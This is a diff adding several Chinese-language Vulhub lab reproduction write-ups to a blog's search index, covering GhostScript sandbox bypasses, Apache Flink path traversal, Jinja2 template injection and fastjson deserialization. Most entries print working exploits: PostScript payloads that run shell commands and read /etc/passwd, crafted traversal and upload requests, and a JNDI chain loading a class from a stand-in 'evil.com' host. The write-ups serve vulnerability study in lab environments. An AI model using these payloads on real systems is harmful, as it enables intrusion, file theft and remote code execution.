@@ -17,6 +17,251 @@
       </tags>
   </entry>
   <entry>
+    <title>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</title>
+    <url>/2021/08/03/GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-6116%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h1><p>2019年1月23日晚，Artifex官方在ghostscriptf的master分支上提交合并了多达6处的修复。旨在修复 CVE-2019-6116 漏洞，该漏洞由 Google 安全研究员 Tavis 于2018年12月3日提交。该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p>
+<p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&amp;desc=2" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1729&amp;desc=2</a></li>
+<li><a href="https://www.anquanke.com/post/id/170255" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170255</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>将可以看到一个上传组件。</p>
+<p>poc.png</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%!PS</span><br><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span><br><span class="line">&#x2F;.actual_pdfpaintproc pdfdict &#x2F;.actual_pdfpaintproc get def</span><br><span class="line"></span><br><span class="line">&#x2F;exploit &#123;</span><br><span class="line">    (Stage 11: Exploitation...)&#x3D;</span><br><span class="line"></span><br><span class="line">    &#x2F;forceput exch def</span><br><span class="line"></span><br><span class="line">    systemdict &#x2F;SAFER false forceput</span><br><span class="line">    userparams &#x2F;LockFilePermissions false forceput</span><br><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileControl [(*)] forceput</span><br><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileWriting [(*)] forceput</span><br><span class="line">    systemdict &#x2F;userparams get &#x2F;PermitFileReading [(*)] forceput</span><br><span class="line"></span><br><span class="line">    % update</span><br><span class="line">    save restore</span><br><span class="line"></span><br><span class="line">    % All done.</span><br><span class="line">    stop</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">errordict &#x2F;typecheck &#123;</span><br><span class="line">    &#x2F;typecount typecount 1 add def</span><br><span class="line">    (Stage 10: &#x2F;typecheck #)&#x3D;only typecount &#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    % The first error will be the .knownget, which we handle and setup the</span><br><span class="line">    % stack. The second error will be the ifelse (missing boolean), and then we</span><br><span class="line">    % dump the operands.</span><br><span class="line">    typecount 1 eq &#123; null &#125; if</span><br><span class="line">    typecount 2 eq &#123; pop 7 get exploit &#125; if</span><br><span class="line">    typecount 3 eq &#123; (unexpected)&#x3D; quit &#125;  if</span><br><span class="line">&#125; put</span><br><span class="line"></span><br><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span><br><span class="line">% executable arrays onto the operand stack that contain .forceput, but are not</span><br><span class="line">% marked as executeonly or pseudo-operators.</span><br><span class="line">%</span><br><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span><br><span class="line">% fail because when the routine was declared, it used &#96;bind&#96; but many of the</span><br><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span><br><span class="line">%</span><br><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span><br><span class="line">% works.</span><br><span class="line">&lt;&lt;</span><br><span class="line">    &#x2F;typecount      0</span><br><span class="line">    &#x2F;PDFfile        &#123; (Stage 0: PDFfile)&#x3D; currentfile &#125;</span><br><span class="line">    &#x2F;q              &#123; (Stage 1: q)&#x3D; &#125; % no-op</span><br><span class="line">    &#x2F;oget           &#123; (Stage 3: oget)&#x3D; pop pop 0 &#125; % clear stack</span><br><span class="line">    &#x2F;pdfemptycount  &#123; (Stage 4: pdfemptycount)&#x3D; &#125; % no-op</span><br><span class="line">    &#x2F;gput           &#123; (Stage 5: gput)&#x3D; &#125;  % no-op</span><br><span class="line">    &#x2F;resolvestream  &#123; (Stage 6: resolvestream)&#x3D; &#125; % no-op</span><br><span class="line">    &#x2F;pdfopdict      &#123; (Stage 7: pdfopdict)&#x3D; &#125; % no-op</span><br><span class="line">    &#x2F;.pdfruncontext &#123; (Stage 8: .pdfruncontext)&#x3D; 0 1 mark &#125; % satisfy counttomark and index</span><br><span class="line">    &#x2F;pdfdict        &#123; (Stage 9: pdfdict)&#x3D;</span><br><span class="line">        % cause a &#x2F;typecheck error we handle above</span><br><span class="line">        true</span><br><span class="line">    &#125;</span><br><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span><br><span class="line"></span><br><span class="line">(Should now have complete control over ghostscript, attempting to read &#x2F;etc&#x2F;passwd...)&#x3D;</span><br><span class="line"></span><br><span class="line">% Demonstrate reading a file we shouldnt have access to.</span><br><span class="line">(&#x2F;etc&#x2F;passwd) (r) file dup 64 string readline pop &#x3D;&#x3D; closefile</span><br><span class="line"></span><br><span class="line">(Attempting to execute a shell command...)&#x3D; flush</span><br><span class="line"></span><br><span class="line">% run command</span><br><span class="line">(%pipe%id &gt; &#x2F;tmp&#x2F;success) (w) file closefile</span><br><span class="line"></span><br><span class="line">(All done.)&#x3D;</span><br><span class="line"></span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<p>上传这个文件，即可执行<code>id &gt; /tmp/success</code>：</p>
+<p><img src="https://image.3001.net/images/20210803/16279564819919.png" alt="image-20210802160743738"></p>
+<p>我们也可以用<code>docker run -it --rm --name uu -v</code>pwd<code>/poc.png:/tmp/poc.png vulhub/imagemagick:7.0.8-27-php identify /tmp/poc.png</code>来直接测试poc：</p>
+<p><img src="https://image.3001.net/images/20210803/16279564834289.png" alt="image-20210802161118686"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>GhostScript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）</title>
+    <url>/2021/08/03/GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-19475%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-19475）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-19475）</h1><p>2018年底来自Semmle Security Research Team的Man Yue Mo发表了CVE-2018-16509漏洞的变体CVE-2018-19475，可以通过一个恶意图片绕过GhostScript的沙盒，进而在9.26以前版本的gs中执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://blog.semmle.com/ghostscript-CVE-2018-19475/" target="_blank" rel="noopener">https://blog.semmle.com/ghostscript-CVE-2018-19475/</a></li>
+<li><a href="https://bugs.ghostscript.com/show_bug.cgi?id=700153" target="_blank" rel="noopener">https://bugs.ghostscript.com/show_bug.cgi?id=700153</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>将可以看到一个上传组件。</p>
+<p>将POC作为图片上传，执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryukZmnyhO</span><br><span class="line">Content-Length: 279</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryukZmnyhO</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file_upload&quot;; filename&#x3D;&quot;1.jpg&quot;</span><br><span class="line">content-Type&#x3D;&quot;image&#x2F;png&quot;</span><br><span class="line"></span><br><span class="line">%!PS</span><br><span class="line">0 1 300367 &#123;&#125; for</span><br><span class="line">&#123;save restore&#125; stopped &#123;&#125; if</span><br><span class="line">(%pipe%id &gt; &#x2F;tmp&#x2F;success &amp;&amp; cat &#x2F;tmp&#x2F;success) (w) file</span><br><span class="line">------WebKitFormBoundaryukZmnyhO--</span><br></pre></td></tr></table></figure>
+
+<p>命令已成功执行</p>
+<p><img src="https://image.3001.net/images/20210803/16279565265753.png" alt="image-20210802154222234"></p>
+<p>当然，真实环境下通常无法直接回显漏洞执行结果，你需要使用带外攻击的方式来检测漏洞。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>GhostScript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</title>
+    <url>/2021/08/03/GhostScript%20%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%EF%BC%88%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-16509%EF%BC%89/</url>
+    <content><![CDATA[<h1 id="GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）"><a href="#GhostScript-沙箱绕过（命令执行）漏洞（CVE-2018-16509）" class="headerlink" title="GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）"></a>GhostScript 沙箱绕过（命令执行）漏洞（CVE-2018-16509）</h1><p>8 月 21 号，Tavis Ormandy 通过公开邮件列表，再次指出 GhostScript 的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞：</p>
+<ul>
+<li><a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">http://seclists.org/oss-sec/2018/q3/142</a></li>
+<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></li>
+</ul>
+<p>GhostScript 被许多图片处理库所使用，如 ImageMagick、Python PIL 等，默认情况下这些库会根据图片的内容将其分发给不同的处理方法，其中就包括 GhostScript。</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>将可以看到一个上传组件。</p>
+<p>poc.png</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict &#x2F;setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark &#x2F;OutputFile (%pipe%id &gt; &#x2F;tmp&#x2F;success &amp;&amp; cat &#x2F;tmp&#x2F;success) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure>
+
+<p>上传<a href="https://github.com/vulhub/vulhub/blob/master/ghostscript/CVE-2018-16509/poc.png" target="_blank" rel="noopener">poc.png</a>，将执行命令<code>id &gt; /tmp/success &amp;&amp; cat /tmp/success</code>。此时进入容器<code>docker-compose exec web bash</code>，将可以看到/tmp/success已被创建：</p>
+<p><img src="https://image.3001.net/images/20210803/1627956211542.png" alt="image-20210802153333116"></p>
+<p><img src="https://image.3001.net/images/20210803/16279562147310.png" alt="image-20210802153426131"></p>
+<p>你也可以使用命令行测试该漏洞：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it --rm --name im -v &#96;pwd&#96;&#x2F;poc.png:&#x2F;poc.png vulhub&#x2F;imagemagick:7.0.8-10 convert &#x2F;poc.png &#x2F;poc.gif</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210803/16279562164625.png" alt="image-20210802153156184"></p>
+<p>可见，id命令已被成功运行。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>GhostScript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Flink `jobmanager/logs` 路径遍历 (CVE-2020-17519)</title>
+    <url>/2021/08/02/Apache%20Flink%20jobmanager-logs%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%20(CVE-2020-17519)/</url>
+    <content><![CDATA[<h1 id="Apache-Flink-jobmanager-logs-路径遍历-CVE-2020-17519"><a href="#Apache-Flink-jobmanager-logs-路径遍历-CVE-2020-17519" class="headerlink" title="Apache Flink jobmanager/logs 路径遍历 (CVE-2020-17519)"></a>Apache Flink <code>jobmanager/logs</code> 路径遍历 (CVE-2020-17519)</h1><p>Apache Flink 是一个开源的流处理框架，具有强大的流处理和批处理能力。</p>
+<p>Apache Flink 1.11.0 中引入的更改（以及在 1.11.1 和 1.11.2 中发布）允许攻击者通过 JobManager 进程的 REST 接口读取 JobManager 本地文件系统上的任何文件。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801" target="_blank" rel="noopener">https://github.com/apache/flink/commit/b561010b0ee741543c3953306037f00d7a9f0801</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17519" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2020-17519</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Apache Flink 启动后，访问<code>http://192.168.44.132:8081</code>查看主页。</p>
+<p>查看<code>/etc/passwd</code>文件内容，访问</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.44.132:8081&#x2F;jobmanager&#x2F;logs&#x2F;..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210802/16278897684216.png" alt="image-20210802143248275"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache Flink</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Apache Flink 上传路径遍历 (CVE-2020-17518)</title>
+    <url>/2021/08/02/Apache%20Flink%20%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%20(CVE-2020-17518)/</url>
+    <content><![CDATA[<h1 id="Apache-Flink-上传路径遍历-CVE-2020-17518"><a href="#Apache-Flink-上传路径遍历-CVE-2020-17518" class="headerlink" title="Apache Flink 上传路径遍历 (CVE-2020-17518)"></a>Apache Flink 上传路径遍历 (CVE-2020-17518)</h1><p>Apache Flink 是一个开源的流处理框架，具有强大的流处理和批处理能力。</p>
+<p>Apache Flink 1.5.1 引入了 REST 处理程序，允许您通过恶意修改的 HTTP HEADER 将上传的文件写入本地文件系统上的任意位置。</p>
+<p>参考：</p>
+<ul>
+<li><a href="https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4" target="_blank" rel="noopener">https://github.com/apache/flink/commit/a5264a6f41524afe8ceadf1d8ddc8c80f323ebc4</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-17518" target="_blank" rel="noopener">https://nvd.nist.gov/vuln/detail/CVE-2020-17518</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>Apache Flink 启动后，访问<code>http://192.168.44.132:8081</code>查看主页。</p>
+<p>使用以下请求将文件上传到<code>/tmp/success</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8081</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Length: 187</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;success&quot;</span><br><span class="line"></span><br><span class="line">success</span><br><span class="line">------WebKitFormBoundaryoZ8meKnrrso89R6Y--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210802/16278897778124.png" alt="image-20210802142521033"></p>
+<p>查看<code>/tmp</code>文件夹内，成功上传success文件</p>
+<p><img src="https://image.3001.net/images/20210802/16278897801388.png" alt="image-20210802142614447"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Apache Flink</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Flask（Jinja2） 服务端模板注入漏洞</title>
+    <url>/2021/07/22/Flask%EF%BC%88Jinja2%EF%BC%89%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Flask（Jinja2）-服务端模板注入漏洞"><a href="#Flask（Jinja2）-服务端模板注入漏洞" class="headerlink" title="Flask（Jinja2） 服务端模板注入漏洞"></a>Flask（Jinja2） 服务端模板注入漏洞</h1><p>参考文章：</p>
+<ul>
+<li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li>
+<li><a href="http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates" target="_blank" rel="noopener">http://rickgray.me/use-python-features-to-execute-arbitrary-codes-in-jinja2-templates</a></li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.44.132/?name=49</code>，得到49，说明SSTI漏洞存在。</p>
+<p><img src="https://image.3001.net/images/20210722/16269359288107.png" alt="image-20210722141001147"></p>
+<p>获取eval函数并执行任意python代码的POC：</p>
+<p><img src="https://image.3001.net/images/20210803/16279577635357.png" alt="image-20210803102916576"></p>
+<p><img src="https://image.3001.net/images/20210803/16279577953454.png" alt="image-20210803102944551"></p>
+<p><img src="https://image.3001.net/images/20210722/16269359314215.png" alt="image-20210722141128939"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>jinja2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>fastjson 1.2.24 反序列化导致任意命令执行漏洞</title>
+    <url>/2021/07/21/fastjson%201.2.24%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="fastjson-1-2-24-反序列化导致任意命令执行漏洞"><a href="#fastjson-1-2-24-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 1.2.24 反序列化导致任意命令执行漏洞"></a>fastjson 1.2.24 反序列化导致任意命令执行漏洞</h1><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p>
+<a id="more"></a>
+
+<p>参考资料：</p>
+<ul>
+<li><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></li>
+<li>[<a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/]" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/]</a>(<a href="http://xxlegend.com/2017/04/29/title-" target="_blank" rel="noopener">http://xxlegend.com/2017/04/29/title-</a> fastjson 远程反序列化poc的构造和分析/)</li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境运行后，访问<code>http://192.168.44.132:8090</code>即可看到JSON格式的输出。</p>
+<p><img src="https://image.3001.net/images/20210721/16268479292335.png" alt="image-20210720165705779"></p>
+<p>我们向这个地址POST一个JSON对象，即可更新服务端的信息：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.44.132:8090&#x2F; -H &quot;Content-Type: application&#x2F;json&quot; --data &#39;&#123;&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20&#125;&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210721/16268479338336.png" alt="image-20210720173523189"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8090</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;91.0.4472.164 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 26</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210721/16268479359558.png" alt="image-20210720170306920"></p>
+<p>因为目标环境是Java 8u102，没有<code>com.sun.jndi.rmi.object.trustURLCodebase</code>的限制，我们可以使用<code>com.sun.rowset.JdbcRowSetImpl</code>的利用链，借助JNDI注入来执行命令。</p>
+<p>首先编译并上传命令执行代码，如<code>http://192.168.44.132/TouchFile.class</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"></span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt &#x3D; Runtime.getRuntime();</span><br><span class="line">            String[] commands &#x3D; &#123;&quot;touch&quot;, &quot;&#x2F;tmp&#x2F;success&quot;&#125;;</span><br><span class="line">            Process pc &#x3D; rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210721/16268479408749.png" alt="image-20210720205159578"></p>
+<p>然后我们借助<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a>项目，启动一个RMI服务器，监听9999端口，并制定加载远程类<code>TouchFile.class</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;evil.com&#x2F;#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210721/16268479449284.png" alt="image-20210720203256114"></p>
+<p>向靶场服务器发送Payload，带上RMI的地址：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Content-Length: 160</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;192.168.44.132:9999&#x2F;TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20210721/16268479471714.png" alt="image-20210720203339214"></p>
+<p>监听端得到反馈</p>
+<p><img src="https://image.3001.net/images/20210721/16268479505903.png" alt="image-20210720203433935"></p>
+<p>可见，命令<code>touch /tmp/success</code>已成功执行：</p>
+<p><img src="https://image.3001.net/images/20210721/16268479539899.png" alt="image-20210720205228437"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>Fastjson</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Fastjson 1.2.47 远程命令执行漏洞</title>
+    <url>/2021/07/21/Fastjson%201.2.47%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Fastjson-1-2-47-远程命令执行漏洞"><a href="#Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="Fastjson 1.2.47 远程命令执行漏洞"></a>Fastjson 1.2.47 远程命令执行漏洞</h1><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p>
+<a id="more"></a>
+
+<p>参考链接：</p>
+<ul>
+<li><a href="https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955" target="_blank" rel="noopener">https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955</a></li>
+<li><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></li>
+</ul>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8090</code>即可看到一个json对象被返回，我们将content-type修改为<code>application/json</code>后可向其POST新的JSON对象，后端会利用fastjson进行解析。</p>
+<p>首先编译并上传命令执行代码，如<code>http://192.168.44.132/TouchFile.class</code>：</p>
